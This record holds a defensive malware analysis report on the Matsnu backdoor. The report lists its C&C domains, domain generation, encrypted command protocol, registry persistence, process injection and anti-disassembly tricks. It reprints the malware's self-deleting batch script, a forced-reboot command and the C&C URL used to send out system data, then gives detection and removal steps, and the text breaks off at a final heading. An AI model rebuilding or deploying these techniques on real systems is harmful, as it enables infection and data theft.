{
    "id": "24bc1c03-5693-499d-85ed-c7a3aa84df75",
    "created_at": "2022-10-25T16:48:21.217354Z",
    "updated_at": "2025-03-27T02:16:25.804662Z",
    "deleted_at": null,
    "sha1_hash": "82f72b39fb12e02ddb2997f302c3898285da0022",
    "title": "Word Template",
    "authors": "",
    "file_creation_date": "2015-07-08T12:35:12Z",
    "file_modification_date": "2015-07-08T12:35:12Z",
    "file_size": 889563,
    "plain_text": "# MATSNU\n\n## Malware ID\n\n### 15/05/2015\n\n Researcher: Stanislav Skuratovich\n\n**Research includes** **Malware Overview**\n\n1. Communication signature The Matsnu malware is an x86 infector that acts as a backdoor\n\nafter it infiltrates a computer system. The malware uses DGA to\n\n2. Malware operation\n\ncommunicate with the C&C server. This technique protects the\n\n3. Detection, Remediation and Removal malware image from any attempted string dumping, blacklisting\n\ndumped domains, or shutting down domains. Matsnu has a\n\n4. Additional info\n\nnumber of anti-disassembling features and packing techniques\n\n5. Appendix\n\nwhich make the analysis process more challenging.\n\n# Communications signature\n\n## C&C URLs\n\nMatsnu has a hardcoded list of domains. It also has the ability to generate new domains via DGA, using two\npredefined dictionaries. See DGA for more details. The hardcoded domains include:\n```\nability-counter.com camp-shelter.com diet-commit-garden.com\naccident-muscle.com candidate-refuse.com dishcow-catcondition.com\nairportwake-money.com caproom-purpose.com door-smoke-class.com\nambition-lawyer.com champion-charge.com dot-take-article.com\nart-spite-tune.com choice-warn-ease.com dust-market-library.com\nassignmentrent.com cluelist-midnight.com face-fail-note.com\nattempttune-temperature.com codesail-staff.com farm-pin-brain.com\nbeachloose-appeal.com committeerange.com feature-commit.com\nbedwater-spite.com condition-title.com finger-space.com\nbicyclereply.com conference-shower.com flowerdie-reason.com\nbite-team-indication.com coursetrust-rule.com flowertest-tool.com\nblack-meet-fat.com courtdecide-fun.com foodproposed.com\nbone-twist-swimming.com credit-peak-blow.com foot-value-specialist.com\nbrain-recommend.com databasepiece.com functionstable.com\nbugeffect-garbage.com date-star-bake.com gearbank-craft.com\ncamp-reason-shoe.com departureloves.com gearovercome.com\n                 devilblue-subject.com\n\n```\n|Research includes 1. Communication signature 2. Malware operation 3. Detection, Remediation and Removal 4. Additional info 5. Appendix|Malware Overview The Matsnu malware is an x86 infector that acts as a backdoor after it infiltrates a computer system. The malware uses DGA to communicate with the C&C server. This technique protects the malware image from any attempted string dumping, blacklisting dumped domains, or shutting down domains. Matsnu has a number of anti-disassembling features and packing techniques which make the analysis process more challenging.|\n|---|---|\n\n\n-----\n\n```\ngoldagree-pack.com\nholebone-series.com\ninsectstore-comfort.com\ninstruction-suppose.com\nkuzjutr.com\nkzaop-home.com\nladdercycle-essay.com\nlawyersit-direction.com\nleather-celebrate.com\nlifestaff-historian.com\nloanhesitate.com\nmachinecatch.com\nmap-dump-path.com\nmark-quarter.com\nmaterial-interview.com\nmetal-pace-purple.com\nmetal-pacpurple.com\nmidnightdrivers.com\nmodelspread-process.com\n\n# DGA\n\n```\n```\nneckreach-boy.com\nneckreachboys.com\nnereachboys.com\nnothingpaint.com\noilcurve-economy.com\noilcurveeconomys.com\norder-hold-salt.com\norders-holdsalt.com\npaintcourt-edge.com\npaintfinance.com\npairdetermin-online.com\npairdetermine.com\npark-expect-register.com\npenaltypin-pipe.com\npeopleretire.com\nperiod-influence.com\nphrase-smile.com\npiano-bear-letter.com\nplayer-determine.com\n\n```\n```\nprofession-become.com\nquantity-throw.com\nquestion-exist.com\nshape-blame-iron.com\nshareeffect-affair.com\nskysolve-lunch.com\nspeakerget-button.com\nstress-consider.com\nstuff-camp-research.com\ntroublepace-summer.com\nuncle-district.com\nuncle-implement.com\nvegetable-ease.com\nvehicledistance.com\nvideo-meet-brick.com\nwarcelebrate.com\nwineapologize.com\nwineoperate-meaning.com\n\n```\n\nTo generate domains, the malware uses two predefined dictionaries, a few constants and variables, and the\nnumber of days since the epoch. Domains are generated for the current day as well as the previous two days,\nand encrypted for later use. The malware tries to connect the hardcoded domains and the domains generated for\nthe current and previous two days. The algorithm and the dictionaries’ content can be found in Appendix A.\n\n# Communication encryption with the C&C server\n\n## Client side\n\nEach packet sent by the client to the C&C server is encrypted using an RSA public key and stored in memory.\nAfter encryption, the data is base64 encoded and sent as an HTTP packet content to the server.\n\n## Server side\n\nEach packet received by the client from the C&C server is encrypted using AES and a manual encryption routine.\nThe AES key is generated by the client side and sent to the server using an **AES=%s parameter. The server**\nencrypts the content of each packet, starting from the 16[th] byte, with the following key:\n```\nKey = SHA-256(${received_key} + ${predef_key})\n\n```\nThe first 16 bytes are used to perform a mathematical XOR operation on bytes 16 - 32 on the AES decrypted\npacket. The decryption routine pseudo code is shown in Appendix B (decrypt_received_data).\n\n\n-----\n\n# Initial communication with the C&C server\n\nTo send information from the infected machine to the C&C server, the malware fills a predefined string, shown\nbelow. Base64 encode sum calculation is performed on this string (further `GET_KEY). Next, the following routine`\ngenerates a resource parameters query for the C&C server URL (further RESOURCE_QUERY_PARAM):\n```\nid=%s&mynum=%u&ver=%s&cvr=%u&threadid=%u&lang=0x%04X&os=%s&crcblw=%08x&get=sysinfo\ndef gen_resource_params_query():\n params_number = random.randint(0x1, 0x5)\n query_par = '?'\n for i in range(params_number):\n  query_param += generate_random_n_key(random.randint(0x2, 0x5))\n  query_param += some_rand_gen_val_func() + '&'\n query_par = query_par[:-1]\n return query_par\n\n```\nThe malware creates a parameter that stores the initial packet configuration information. See **Malware**\n**Operation: Execution Process.**\n```\nsysinfo=base64_encode(${system_info})\n\n```\nThe malware then performs key generation, using the generate_alpha_key(rand(0x20, 0x40)), also called\n```\nAES_KEY. See Execution Process: Main Operation. \n\n```\nThe malware generates a new string (also called PACKET):\n```\nGET=${GET_KEY}&AES=${AES_KEY}&sysinfo=${sysinfo}\n\n```\nPACKET is encrypted using an RSA public key. It is base64 encoded before the encrypted data is sent via HTTP\nprotocol. Next, a random string is generated and is used as the name of the variable:\n```\n${enc_data_query_param}=${encrypted_packet_base64}\n\n```\nThe malware sends a packet to the C&C server and waits for a response. The following URL is used:\n```\n(http|ftp|htpps)://${domain-name}/${resource}${RESOURCE_QUERY_PARAM}\n\n```\nThe default value for ${resource} is “im.php”\n\nAfter a response packet is received, AES decryption routine is performed using a SHA-256 generated key. The\ndecrypted packet is validated via a few validation routines. The pseudo code of the entire communication routine\nis shown in Appendix B. The malware stops querying domains after a valid packet is received. If such an event\noccurred, the infected process creates a thread that is responsible for generating domains for the current and\nprevious two days, and starts the main communication loop with the C&C server.\n\n\n-----\n\n# Communication protocol with the C&C server\n\n## Client side\n\nEach packet sent to the C&C server has the following structure (before full encryption):\n```\nGET=%s&AES=%s&%s=%s\n\n```\nParameter descriptions:\n\n**PARAMETER** **DESCRIPTION**\n\nGET Base64 encoded information that identifies the infected computer, configuration and command. See\n\n**machine identification information for a full description.**\n\nAES Randomly generated key [0x20, 0x40] bytes in length. Used for server side encryption and client side decryption of\n\nreceived packets (generate_alpha_key(rand(0x20, 0x40)). See Malware Operation: Execution Process\n\n%s (optional) Base64 encoded additional information for specified commands. See Additional info for a full description.\n\n## Infected machine identification information\n\nIdentification information for the infected machine is shown as follows:\n```\nid=%s&mynum=%u&ver=%s&cvr=%u&threadid=%u&lang=0x%04X&os=%s&crcblw=%08x&%s\n\n```\nParameter descriptions:\n\n**PARAMETER** **DESCRIPTION**\n\nid Unique infected machine ID (gen_unique_id()). See Malware Operation: Execution Process\n\nmynum ??? (For analyzed sample 0).\n\nver Malware version (analyzed sample “ldr2002”).\n\ncvr ??? (For analyzed sample 16).\n\nthreadid Thread ID of infected thread.\n\nlang System default language.\n\nos Operating system version (subsystem and platform).\n\ncrcblw ??? Possible CRC32 sum of blacklisted words.\n\n%s (optional) Command string. Possible command strings are shown in the Command strings table below.\n\n## Command strings\n\n|PARAMETER|DESCRIPTION|\n|---|---|\n|GET|Base64 encoded information that identifies the infected computer, configuration and command. See Infected machine identification information for a full description.|\n|AES|Randomly generated key [0x20, 0x40] bytes in length. Used for server side encryption and client side decryption of received packets (generate_alpha_key(rand(0x20, 0x40)). See Malware Operation: Execution Process.|\n|%s (optional)|Base64 encoded additional information for specified commands. See Additional info for a full description.|\n\n|PARAMETER|DESCRIPTION|\n|---|---|\n|id|Unique infected machine ID (gen_unique_id()). See Malware Operation: Execution Process.|\n|mynum|??? (For analyzed sample 0).|\n|ver|Malware version (analyzed sample “ldr2002”).|\n|cvr|??? (For analyzed sample 16).|\n|threadid|Thread ID of infected thread.|\n|lang|System default language.|\n|os|Operating system version (subsystem and platform).|\n|crcblw|??? Possible CRC32 sum of blacklisted words.|\n|%s (optional)|Command string. Possible command strings are shown in the Command strings table below.|\n\n|PARAMETER|DESCRIPTION|\n|---|---|\n|get=sysinfo|Send system info to the server.|\n|get=cmd|Send the C&C server command response.|\n|get=raport|R(e)?port status code information.|\n|get=config|Ready to send information about loaded DLLs and processes.|\n\n\n-----\n\n## Additional information\n\n**PARAMETER** **APPENDED DATA TO GET=%S&AES=%S** **DESCRIPTION**\n\n`get=sysinfo` sysinfo=%s System information. See Malware Operation:\n**Execution Process.**\n\n`get=cmd` dlllist=%s&proclist=%s List of requested files in the file system and list of\nsystem processes.\n\n`get=config` - \n`get=config` idt=%u&code=%u Field “idt” represents an identifier sent by the C&C\nwith the operation request. Field “code\noperation status code.\n\n## Server side\n\nEach packet received from the C&C server (after full decryption) has the following structure:\n```\nstruct matsnu_cc_packet {\n std::string command;\n uint32_t  data_length;\n uint32_t  crc32_data_checksum;\n std::string data;\n};\n\n```\nPacket validation pseudo code is represented in the packet_validate() routine. See Appendix B.\n\nThe malware supports these commands:\n\n|PARAMETER|APPENDED DATA TO GET=%S&AES=%S|DESCRIPTION|\n|---|---|---|\n|get=sysinfo|sysinfo=%s|System information. See Malware Operation: Execution Process.|\n|get=cmd|dlllist=%s&proclist=%s|List of requested files in the file system and list of system processes.|\n|get=config|-|-|\n|get=config|idt=%u&code=%u|Field “idt” represents an identifier sent by the C&C with the operation request. Field “code” represents the operation status code.|\n\n|COMMAND (string)|VALUE|DESCRIPTION|\n|---|---|---|\n|WAIT|0x01|Wait for the command.|\n|CONFIG|0x0A|Send configuration information, such as a request for files present in the file system, running processes, and new blacklisted words.|\n|UPGRADE|0x34|Download data from the specified URL. After the download is complete, it functions as an UPGRADE command.|\n|EXECUTE|0x36|Execute data specified in the parameter.|\n|LOAD|0x37|Download data from the specified URL. After the download is complete, it functions as an EXECUTE command.|\n\n\n-----\n\n## CONFIG\n\nCONFIG packet data field accepted wordlist:\n\n**ROUTINE (STRING)** **DESCRIPTION**\n\nWAIT Wait for the command.\n\n--- WAIT --- Wait for the command.\n\nDLLLIST Specifies names of files. If at least one specified file is present in the system, information is sent to the C&C server\nwith a list of the files present.\n\nPROCLIST Specifies names of processes. If at least one specified process is present in the system, information is sent to the\nC&C server with a list of the processes present.\n\nBLWORDS Adds specified blacklisted words to the {GUID}.tmp file in encrypted form, using AES and manual mathematical\nXOR encryption.\n\nThe data format:\n```\nBLWORDS:${LIST_OF_BLACKLIST_WORDS(SEPARATOR:,)}--BLWORDS\nDLLLIST:${LIST_OF_PRESENCE_CHECK_FILES(SEPARATOR:|)}--DLLLIST\nPROCLIST:${LIST_OF_PRESENCE_CHECK_PROCESSES(SEPARATOR:|)}--PROCLIST\n\n## UPGRADE, UPGRADEURL, EXECUTE, LOAD commands\n\n```\nThe UPGRADE, UPGRADEURL, EXECUTE, and LOAD packets data field must have this format:\n```\n${operation_id}:${operation_data}\n\n```\nOne of the restrictions for the packet is that the length of the ${operation_id} + ‘:’ string must be less than\n```\n0xB bytes.\n${operation_data} can be sent by the C&C server in three formats: \n\n```\n  - Binary.\n\n  - RCPK. See RCPK data format description.\n\n  - URL.\n\nAccepted formats for each command:\n\n**COMMAND** **${OPERATION_DATA} ACCEPTED FORMATS**\n\nUPGRADE Binary data or RCPK format data.\n\nUPGRADEURL URL.\n\nEXECUTE Binary data or RCPK format data.\n\nLOAD URL.\n\nGeneral error codes:\n\n|ROUTINE (STRING)|DESCRIPTION|\n|---|---|\n|WAIT|Wait for the command.|\n|--- WAIT ---|Wait for the command.|\n|DLLLIST|Specifies names of files. If at least one specified file is present in the system, information is sent to the C&C server with a list of the files present.|\n|PROCLIST|Specifies names of processes. If at least one specified process is present in the system, information is sent to the C&C server with a list of the processes present.|\n|BLWORDS|Adds specified blacklisted words to the {GUID}.tmp file in encrypted form, using AES and manual mathematical XOR encryption.|\n\n|COMMAND|${OPERATION_DATA} ACCEPTED FORMATS|\n|---|---|\n|UPGRADE|Binary data or RCPK format data.|\n|UPGRADEURL|URL.|\n|EXECUTE|Binary data or RCPK format data.|\n|LOAD|URL.|\n\n|ERROR CODE|DESCRIPTION|\n|---|---|\n|0x0|Success.|\n|0x14|Error while communicating with specified URL.|\n|0x29a|Empty packet received.|\n|0x3e6|${operation_id} field overflow length boundaries.|\n|0x3e7|Invalid received packet format (‘:’ is missing).|\n\n\n-----\n\n## RCPK data format description\n\nRCPK data format structure:\n```\nstruct execute_rcpk_packet {\n struct hdr {\n  char magic[4] = { 'R', 'C', 'P', 'K' };\n  uint32_t a;\n  uint32_t magic_byte;\n  uint32_t size_1;\n  uint32_t size_2;\n };\n char signature[0x100];\n std::string data;\n};\n\n```\nThis routine is used to check if the specified data is RCPK (valid) format data:\n```\ndef is_execute_rcpk_packet(rcpk, rcpk_size):\n if rcpk.hdr.magic != 'RCPK':\n  return (0x0, rcpk)\n if rcpk.hdr.size_1 + rcpk.hdr.size_2 + 0x14 != rcpk_size:\n  return (0x1, None)\n sign = rcpk[0x14:0x114]\n data = rcpk[0x114:]\n md5sum = md5.new(data)\n if verify_key_sign(pub_key, sign, md5sum):\n  return (0x2, None)\n return (0x0, decrypt(pub_key, data))\n\n```\nAfter parsing the RCPK packet type, the next steps are based on the magic_byte field in the header structure.\nThe entire incoming packet parsing routine:\n```\ndef parse_packet(data):\n rcpk_packet_info = is_execute_rcpk_packet(data, len(data))\n if rcpk_packet_info[0] != 0x0:\n  return data\n rcpk_packet = rcpk_pakcet_info[1]\n if rcpk_packet.hdr.magic_byte != 0x1:\n  return rcpk.data\n return is_execute_lzw_data(rcpk.data)\n\n```\nLZW structure and its parsing procedure:\n```\nstruct execute_lzw_data {\n char magic[4] = { 'L', 'Z', 'W', '!' };\n uint32_t size;\n std::string data;\n};\ndef is_execute_lzw_data(lzw_data, lzw_data_size):\n if rcpk_data_size < 0xd:\n  return 0\n if rcpk_data.magic != 'LZW!':\n  return 0\n return manual_decrypt(rcpk_data.data)\n\n```\n\n-----\n\n## UPGRADE\n\nThis command, responsible for starting a binary, is received from the C&C server. Binary data is stored on the\ndisc. If the size of the binary data is greater than or equal to 0x14, an RCPK data format check is made. If the\npacket parsing succeeds, the decrypted data is placed as content in the new %TEMP% folder file.\n\nIf the packet size is less than 0x14 bytes, the malware creates a file in the %TEMP% folder and writes the received\ndata to that file.\n```\n{%08X-%04X-xxx}.exe\n\n```\nAfter successful file creation, the malware tries to create a key in this registry entry:\n```\nKey: \"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\": \nValue: {%08X-%04X-%s} = $PATH_TO({%08X-%04X-xxx}.exe)\n\n```\nTo submit an upgrade, the malware attempts to reboot the operating system with this command:\n```\nshutdown.exe -r -f -t 0\n\n```\nError codes returned by the command:\n\n**ERROR CODE** **DESCRIPTION**\n\n0x0 Success.\n\n0xfa1 RCPK invalid format.\n\n0xfa2 RCPK data decryption failed.\n\n0xfa3 RCPK data magic is invalid.\n\n0xfa4 RCPK LZW structure parsing failed.\n\n0xfa5 Unable to create a file in %TEMP% folder.\n\n0xfa6 Unable to create new subkey in\n```\n            \"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\".\n\n```\n0xfa7 Unable to set a registry key value.\n\n0x1776 Unable to allocate memory.\n\n## UPGRADEURL\n\nThis command is responsible for downloading data from a specified URL. If the download operation was\nsuccessful, this command functions like the UPGRADE command.\n\nError codes returned by the command are the same as those returned by the UPGRADE command. See\n**UPGRADE.**\n\n## EXECUTE\n\nThis command is responsible for executing the data sent by the C&C server. If the size of the binary data is\ngreater than or equal to 0x14, an RCPK data format check is made. If the packet parsing succeeds, the decrypted\ndata is placed as content in the new %TEMP% folder file.\n\nIf the packet size is less than 0x14 bytes, the malware creates a file in %TEMP% folder and writes the received data\nto that file.\n```\n{%08X-%04X-%2X}\n\n```\nAfter successful file creation, the malware attempts execution.\n\n|ERROR CODE|DESCRIPTION|\n|---|---|\n|0x0|Success.|\n|0xfa1|RCPK invalid format.|\n|0xfa2|RCPK data decryption failed.|\n|0xfa3|RCPK data magic is invalid.|\n|0xfa4|RCPK LZW structure parsing failed.|\n|0xfa5|Unable to create a file in %TEMP% folder.|\n|0xfa6|Unable to create new subkey in \"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\".|\n|0xfa7|Unable to set a registry key value.|\n|0x1776|Unable to allocate memory.|\n\n\n-----\n\nError codes returned by the command routine:\n\n**ERROR CODE** **DESCRIPTION**\n\n0x0 Success.\n\n0x1 RCPK invalid format.\n\n0x2 RCPK data decryption failed.\n\n0x3 RCPK data magic is invalid.\n\n0x4 RCPK LZW structure parsing failed.\n\n0x5 Unable to create a file in %TEMP% folder.\n\n0x6 Unable to execute a newly created file (error <= “ERROR_SHARING_VIOLATION”).\n\n## LOAD\n\nThis command is responsible for downloading data from the specified URL. If the download operation was\nsuccessful, this command functions like the EXECUTE command.\n\nError codes returned by the command are the same as those returned by the EXECUTE command. See\n**EXECUTE.**\n\n## Main communication loop\n\nThe main communication loop between the infected computer and the C&C server performs simple actions that\nparse received data and send responses to the server. The pseudo code can be found in Appendix C.\n\n|ERROR CODE|DESCRIPTION|\n|---|---|\n|0x0|Success.|\n|0x1|RCPK invalid format.|\n|0x2|RCPK data decryption failed.|\n|0x3|RCPK data magic is invalid.|\n|0x4|RCPK LZW structure parsing failed.|\n|0x5|Unable to create a file in %TEMP% folder.|\n|0x6|Unable to execute a newly created file (error <= “ERROR_SHARING_VIOLATION”).|\n\n\n-----\n\n# Malware Operation\n\n## Installation\n\nThe malware must perform a few allocating and deallocating memory operations to unpack its code and data. We\nassume the malware is packed a few times via manual and UPX packers, as two UPX sections appeared after\nthe initial decryption routine. After full unpacking, the code looks like trash code because of the many jumps to\nother instruction addresses and the mix of code with data. Many functions have the same anti-disassembling\ntechnique. See Concealment: Anti-Analysis & Anti-Reverse Engineering Code.\n\nAfter all the decryption steps are complete, the process lands on the new entry point and performs these steps to\nstart the infection routine:\n\n1. Fill import table with function addresses from libraries.\n2. Create two mutexes:\n```\n      MAIN${crc32(fileimage)}MUTEX\n      COPY${crc32(filename)}MUTEX\n\n```\n3. Create a child process (the same executable file).\n4. Select a new process name that will start in a suspended state. The malware has a predefined\n\nbase64-encoded and encrypted list of processes. The infected process name is chosen using a\nrandom generator. See the list of decrypted predefined processes in Appendix E and the decryption\nalgorithm in Appendix D.\n5. Allocate two memory chunks with sizes 0x50 and 0x13e00 bytes in the newly created process. Copy\n\nthe code in the newly allocated region of memory. (The first payload is a trampoline, and the second\none is the malware image).\n6. Duplicate two handles to the newly created process space: the current process handle and the MAIN\n\nmutex handle.\n7. Set the newly created process thread context (EIP register is set to the address of the first payload)\n\nand resume thread execution.\n8. Create a batch file in the current user %TEMP% directory using a random name obtained via a\n\n“GetTickCount” call. It has the following content:\n```\n      attrib -r -s -h %1\n      :${rand_label}\n      del %1\n      if exist %1 goto ${rand_label}\n      del %0\n\n```\n(There is an infinite loop to ensure that the file specified in the argument is not removed. At the end,\nthe script removes itself).\n\nExecutes a command ${PATH_TO_BATCH_FILE} ${PATH_TO_MALWARE_FILE}.\n\n9. Sleep for 20 seconds (wait to be killed by the newly created process).\n\n\n-----\n\n# Execution Process\n\n## Start of the installation\n\nThe infected application begins reading a piece of memory from the parent process and then kills it. Basic\ninformation collected includes:\n\n    - System time\n\n    - Path to system temporary folder\n\n    - Path to system folder\n\n    - System volume info\n\n## Main operation\n\n**Appendix D shows the algorithm which decrypts some of the data chunks.** **Appendix F shows data received**\nafter the decryption routine.\n\nThis key is used for internal data decryption:\n```\ng?[GU,=)5d<YQnv%&]0i^yU+G:Q0gbP\n\n```\nA new folder is created in the system to save the data. For example, the `%LOCALAPPDATA%, %APPDATA% or`\n`%TEMP%` user folder:\n```\n${PATH_TO_FOLDER}/${generated_folder_name}/${generated_filename}\n\n```\nThe folder name is generated using encrypted dictionaries (see **Appendix A): random entries are taken and**\ndecrypted. The decrypted entries are then concatenated with another decrypted string from the dictionary (in our\nparticular malware case this is the “organization” string):\n```\nOrganization_?${decrypted_entry_1}\n\n```\nThe file name is generated in a similar way:\n```\norganization-?${decrypted_entry_2}\n\n```\nThe same is true for the registry key name:\n```\norganization${decrypted_entry_3}\n\n```\nThe original malware image is copied to a newly created file. The infected process tries to delete the original\nmalware file via the “DeleteFile” and “MoveFileEx” (which uses “MOVEFILE_DELAY_UNTIL_REBOOT” flag)\nfunctions.\n\nTo make the malware a permanent part of the system, registry keys are then used to save information:\n```\nKey: \"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" (HKEY_CURRENT_USER)\nValue: organization${decrypted_entry_3} = ${path_to_malware}\nKey: \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\" (HKEY_CURRENT_USER)\nValue: organization${decrypted_entry_3} = ${path_to_malware}\n\n```\nA subkey is created to specify the path to the newly-created malware executable.\n\n\n-----\n\nThe malware sets its own permissions on this registry key:\n```\n“Software\\Microsoft\\Windows Nt\\CurrentVersion\\Winlogon” (HKEY_CURRENT_USER)\n\n```\nNote: it is not possible to read from or write to a specified key after the operation is performed.\n\nAs the malware didn’t write any key to the specified entry, we speculate that this feature can be used by another\ndownloaded malware module from the C&C server.\n\nThe malware uses the following mutex to show its presence on the computer:\n```\nCURRENT${crc32(somedata)}MUTEX\n\n```\nThe malware starts a new thread that is responsible for checking if the registry key `Run was changed. If the`\nmalware registry entry was changed, the subkey creation operation is performed again. The event name used for\nthis purpose is shown below.\n```\nRME83921\n\n```\nThe following operating system and hardware information is collected:\n\n  - User name.\n\n  - Computer name.\n\n  - New malware file time creation.\n\n  - Current process id (used to create a {GUID}.tmp file in %TEMP% folder for storing data).\n\n  - Windows subsystem version (for example, 5.1.1).\n\n  - Windows platform version (for example, 32 or 64).\n\n  - User default language and system default language.\n\n  - Processor info using “HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\” registry key.\n\n  - Graphical card information.\n\n  - Information about the virtual environment use of registry keys:\n```\n    “HARDWARE\\ACPI\\DSDT\\PTLTD_”\n    “HARDWARE\\ACPI\\DSDT\\VBOX__”\n    “HARDWARE\\ACPI\\DSDT\\AMIBI”\n\n```\n  - Antivirus presence. See the list of antivirus names in Appendix F.\n\n  - Drive information in the following format:\n```\n    ${drive_name}\\${drive_type} ${free_space_info} ${volume_info}\n\n```\n\n-----\n\nIf any drive information could not be gathered, it is filled with an empty string. Possible values of each option\ninclude:\n\n**FIELD** **FORMAT STRING** **POSSIBLE OPTIONS (DESCRIPTION)**\n\n`${drive_type}` %s DRIVE_NO_ROOT_DIR\n\nDRIVE_REMOVABLE\n\nDRIVE_FIXED\n\nDRIVE_REMOTE\n\nDRIVE_CDROM\n\nDRIVE_RAMDISK\n\nDRIVE_UNKNOWN\n\n`${free_space_info}` (%u/%u/%u/%u) Sectors per cluster\n\nBytes per sector\n\nNumber of free clusters\n\nTotal number of clusters\n\n`${volume_info}` [%08X:%s] Volume serial number\n\nVolume name\n\nThe user name, computer name and constant are used in order to generate unique ID (further ID) using hash\nfunction and string concatenation. Another ID (further ID2) is generated in the same way, using modified values\nthat were used previously.\n\nThe routine responsible for generation:\n```\ndef gen_unique_id(username, computername, unknownname):\n unique_id = ''\n h = hex(hash_func(username))[2:]\n unique_id += '0' * (8 - len(h)) + h\n h = hex(hash_func(computername))[2:]\n unique_id += '0' * (8 - len(h)) + h\n h = hex(hash_func(unknownname))[2:]\n unique_id += '0' * (8 - len(h)) + h\n return unique_id\n\n```\nThe malware generates a 32-bytes key and calculates the number of days since the epoch. The key generation:\n```\ndef generate_alpha_key(key_len):\n key = ''\n for i in range(key_len):\n  sym = random.randint(0, 255)\n  if sym < 0x1a:\n   sym += 0x41\n  else:\n   sym -= 0x1a\n   sym += 0x61\n  key += sym\n return key\n\n```\n|FIELD|FORMAT STRING|POSSIBLE OPTIONS (DESCRIPTION)|\n|---|---|---|\n|${drive_type}|%s|DRIVE_NO_ROOT_DIR DRIVE_REMOVABLE DRIVE_FIXED DRIVE_REMOTE DRIVE_CDROM DRIVE_RAMDISK DRIVE_UNKNOWN|\n|${free_space_info}|(%u/%u/%u/%u)|Sectors per cluster Bytes per sector Number of free clusters Total number of clusters|\n|${volume_info}|[%08X:%s]|Volume serial number Volume name|\n\n\n-----\n\nThe malware uses an algorithm described in Appendix A to generate domains in the C&C server for the current\nand previous two days. The start date is set to the previously calculated number of days since the epoch. The\nmalware tries to generate 10 domains per day (plus 20 domains for the previous two days). After generation, the\ndomain name is concatenated with the protocol name and script name:\n```\nhttp://${domain-name}/im.php\n\n```\nNext, each domain is encrypted with the RC4 algorithm. A previously generated 32-bytes string is used as a key\nfor the encryption routine.\n\nAt the end of the preparation routine, the malware tries to create two files in the %TEMP% directory using the ID2\nstring, the MD5 hash algorithm, and the following strings:\n```\nCHECK_NS_BLACK_LIST_DOMAINS\nCHECK_NS_BLACK_LIST_WORDS\n\n```\nThe newly-created files are used to store encrypted information about blacklisted words (the malware checks the\nDNS servers’ response), and, we speculate, encrypted information about blacklisted domains.\n\nBefore the malware initializes a communication with the C&C server, it fills the matsnu_init structure:\n```\nclass matsnu_init {\n static std::map<std::string, std::string> opt_val;\n static std::string win_newline = std::string(\"\\r\\n\");\n void set_option(const std::string &o, const std::string &v) {\n  opt_val[o] = v;\n }\n const std::string &get_option(const std::string &o) {\n  return win_newline + opt_val[o];\n }\n};\n\n```\nData that is sent as a sysinfo parameter in the first packet to the C&C server:\n\nID: ${ID}; unique id\n\nComputer name: ${computer_name}; computer name\n\nUser name: ${user_name}; user name\n\nTarget process: ${proc_name}; name of infected process\n\nWindows version: ${subsystem_version}.${platform_version}; operating system info\n\nSystemLangID: ${system_lang_id}; system default language id in hex from\n\nUserLangID: ${user_lang_id}; user default language id in hex from\n\nCPU: ${cpu_info}; cpu information\n\nGPU: ${gpu_name}; gpu name\n\nVM: ${name_of_virtual_env}; name of detected virtual environment, empty if normal machine\n\nDrives: ${all_drives_info}; all drives information\n\nAV: ${av_name}; name of detected antivirus, empty if wasn’t detected\n\n\n-----\n\nBefore computer information is sent, it’s encoded using a base64 encoding routine and initialization packet\ncreation is performed. For a full description, see Communication with C&C: Initial communication with C&C\n**server. The malware then tries to resolve one of the domain names (those that are hardcoded + domains**\ngenerated for the current and previous two days). If the resolution was successful, the malware attempts to send\na packet to the domain and receive a response. If the response was correct, a new thread is started. This thread\ngenerates new domains for the current and previous days. The routine can be represented as the following code:\n```\ndef thread_generate_domains():\n while True:\n  if date.current_date() != previous_date:\n   acquire_mutex(dg_mutex)\n   generate_domains()\n   release_mutex(dg_mutex)\n  else:\n   os.sleep(600) ; sleep for 10 minutes\n\n```\nThe main malware thread starts communication with the C&C server. The protocol is fully described in\n**Communication with C&C: Communication protocol with C&C server.**\n\n# Concealment\n\n## Anti-Analysis & Anti-Reverse Engineering Code\n\nTo prevent process debugging, the malware uses the following technique: An SEH handler is set on the stack.\nNext, an INT1 interrupt is performed (as OllyDbg will not pass an exception to an application by default, the flow\nwill go to the exit). To counteract this technique, we generated a `div ebx (ebx = 0)` instruction to set a\nbreakpoint on the SEH routine.\n\nThe malware is packed multiple times using manual and UPX encryption. All strings are encrypted and encoded\nin the process memory. Decryption takes place only when needed by the malware. Source code for the\ndecryption routine can be found in Appendix D.\n\nNearly all malware functions use the same anti-disassembling trick: jump inside the middle of another instruction.\n\nExample:\n```\n push ebp\n mov ebp, esp\n sub esp, 0xn\n ; stack initialization\n call get_ip\nget_ip:\n pop ebx\n sub ebx, 0xn\n push ebp\n mov ebp, esp\n pop ebp\n lea eax, [ebx + 0xn]\n push eax\n clc\n jb offset\n retn ; jump offset + 1\noffset:\n\n```\n\n-----\n\n```\n ; instruction\n\n```\nUsing simple Python script, we were able to remove this anti-disassembling trick by changing these bytes to a\n(‘\\x90’ * 6) bytes sequence:\n```\n50 push eax\nF8   clc\n72 01 jb loc\nC3   retn\nFF\n\n```\n\n-----\n\n# Detection, Remediation and Removal\n\n## Detection\n\nMalware presence in the system can be detected by the presence any of the following:\n\n  - Mutexes\n```\n    MAIN${crc32}MUTEX\n    COPY${crc32}MUTEX\n    CURRENT${crc32}MUTEX\n\n```\n  - Network traffic. See the hardcoded domains list in **Communication with C&C: URLs of C&C. DGA**\nscript (see Appendix A) can be used to generate domains for the current day.\n\n  - Lack of permissions to the following registry key:\n```\n    “Software\\Microsoft\\Windows Nt\\CurrentVersion\\Winlogon” \n\n```\n  - Strange entries in the specified registry keys seen below, and evidence that names are created using two\npredefined dictionaries (see Appendix A).\n```\n    \"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\n    \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\n## Remediation and Removal\n\n```\nTo remove malware from the infected computer:\n\n  - Kill the infected process (one that generates outgoing network traffic).\n\n  - Check registry keys entries to obtain the malware file path in the system.\n```\n    \"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\n    \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\n```\n  - Remove the file specified by the malware path.\n\n  - Remove the registry key entries specified above.\n\n  - Take ownership of the following registry key:\n```\n    “Software\\Microsoft\\Windows Nt\\CurrentVersion\\Winlogon” (HKEY_CURRENT_USER)\n\n# Additional 